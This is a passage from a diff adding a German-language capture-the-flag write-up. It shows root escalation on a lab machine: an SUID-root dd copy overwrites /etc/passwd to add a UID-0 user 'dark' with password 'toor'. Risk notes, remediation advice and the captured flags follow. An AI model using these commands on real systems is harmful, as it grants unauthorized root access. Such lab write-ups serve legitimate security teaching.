+3.  `echo "dark:aalIoK7SGUI2k:0:0:SuperUser:/root:/bin/bash" >> /tmp/passwd.modified`: Der Eintrag für den neuen Benutzer `dark` wird hinzugefügt. Wichtig sind hier UID `0` und GID `0`, die dem Benutzer Root-Rechte verleihen. Der zuvor generierte Hash wird verwendet.
+</p>
+<p class="evaluation"><strong>Bewertung Schritt 2:</strong>
+Die Vorbereitung der modifizierten `passwd`-Datei ist korrekt. Der neue Benutzer `dark` wird mit Root-Privilegien (UID/GID 0) und dem Passwort "toor" (gehasht) konfiguriert.
+</p>
+
+            <p class="analysis"><strong>Schritt 3: Überschreiben der /etc/passwd Datei und Erlangen der Root-Shell</strong></p>
+            <p>Nun wird die Original-<code>/etc/passwd</code> mit unserer modifizierten Version überschrieben und wir wechseln zum neu erstellten Root-Benutzer.</p>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:~$ <span class="command">./Dashazi if=/tmp/passwd.modified of=/etc/passwd status=none</span></div>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:~$ <span class="command">su dark</span></div>
+        <pre>
+Password: <span class="command">toor</span> 
+<span class="password">root@Umz:/home/umzyyds#</span> <span class="command">id</span>
+<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse Schritt 3:</strong>
+1.  `./Dashazi if=/tmp/passwd.modified of=/etc/passwd status=none`: Die modifizierte Datei `/tmp/passwd.modified` wird mit Root-Rechten über die originale `/etc/passwd` geschrieben.
+2.  `su dark`: Es wird versucht, zum neu erstellten Benutzer `dark` zu wechseln.
+3.  `Password: toor`: Das Passwort "toor" wird eingegeben.
+4.  Der Prompt wechselt zu `root@Umz:/home/umzyyds#`, und der `id`-Befehl bestätigt `uid=0(root) gid=0(root) groups=0(root)`.
+</p>
+<p class="evaluation"><strong>Bewertung Schritt 3:</strong>
+Fantastisch, der Root-Zugriff war erfolgreich! Durch das Überschreiben der `/etc/passwd`-Datei konnte ein neuer Benutzer mit Root-Rechten erstellt werden. Das System wurde vollständig kompromittiert.
+</p>
+
+            <p class="analysis"><strong>Erwartetes Ergebnis:</strong>
+            Durch die Ausführung dieser Schritte wird voller Root-Zugriff auf dem Zielsystem erlangt. Dies ermöglicht das Lesen aller Dateien, das Ausführen beliebiger Befehle und die vollständige Kontrolle über das System.
+            </p>
+            <p class="evaluation"><strong>Beweismittel:</strong>
+            Die erfolgreiche Ausgabe der Root-Flag und die Ausgabe des `id`-Befehls als Benutzer `root` nach dem `su dark`-Befehl dienen als Beweis.
+            </p>
+            <p class="recommendation"><strong>Risikobewertung:</strong>
+            Die Schwachstelle (SUID-Root `dd`) stellt ein maximales Risiko dar (Kritisch/Hoch). Sie ermöglicht einem nicht-privilegierten Benutzer die vollständige Übernahme des Systems. Ein Angreifer kann sensible Daten stehlen, Malware installieren, das System für weitere Angriffe nutzen oder es unbrauchbar machen.
+            </p>
+            <p class="analysis"><strong>Empfehlungen zur Behebung:</strong>
+            <ul>
+                <li>Entfernen Sie sofort die SUID- und SGID-Berechtigungen von der Datei <code>/home/umzyyds/Dashazi</code> (<code>chmod u-s,g-s /home/umzyyds/Dashazi</code>) oder löschen Sie die Datei, wenn sie nicht einem legitimen und absolut notwendigen Zweck dient.</li>
+                <li>Überprüfen Sie das gesamte System auf weitere nicht standardmäßige SUID/SGID-Dateien, insbesondere in Benutzer-Home-Verzeichnissen.</li>
+                <li>Implementieren Sie das Prinzip der geringsten Rechte für alle Benutzer und Prozesse.</li>
+                <li>Verwenden Sie starke, einzigartige Passwörter für alle Konten und erzwingen Sie dies durch Passwortrichtlinien.</li>
+                <li>Speichern Sie Passwörter niemals im Klartext oder mit schwachen Hashing-Algorithmen wie MD5. Setzen Sie stattdessen auf moderne, gesaltete Hashes (z.B. Argon2, scrypt, bcrypt).</li>
+                <li>Überwachen Sie das System auf verdächtige Aktivitäten, einschließlich der Erstellung oder Modifikation kritischer Systemdateien wie <code>/etc/passwd</code> oder <code>/etc/shadow</code>.</li>
+                <li>Stellen Sie sicher, dass die ursprüngliche <code>/etc/passwd</code> und <code>/etc/shadow</code> aus einem Backup wiederhergestellt werden, um den unautorisierten Benutzer <code>dark</code> zu entfernen, falls dies nicht manuell korrigiert wird.</li>
+            </ul>
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/welcome/user.txt</div>
+                    <div class="flag-value"><span class="password">flag{user-4483f72525b3c316704cf126bec02d5c}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">flag{root-a73c45107081c08dd4560206b8ef8205}</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div>
+
+    <footer class="footer">
+        <p>Dark - Cyber Security Reports</p>
+        <p>Berichtsdatum: 3. Juni 2025</p>
+    </footer>
+</body>
+</html>
